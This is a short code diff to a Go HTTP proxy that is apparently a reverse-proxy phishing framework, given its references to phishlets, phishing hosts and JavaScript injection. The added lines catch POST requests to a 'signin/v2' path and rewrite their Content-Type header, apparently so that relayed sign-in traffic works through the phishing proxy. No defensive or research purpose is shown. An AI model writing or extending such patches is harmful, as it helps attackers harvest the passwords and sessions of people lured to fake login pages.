@@ -216,6 +216,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
 
+			// Inject the following code snippet to check for "signin/v2" in the URL and if it's a POST request
+		        if strings.Contains(req.URL.Path, "signin/v2") && req.Method == http.MethodPost {
+		            req.Header.Set("Content-Type", "application/json")
+		        }
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
 
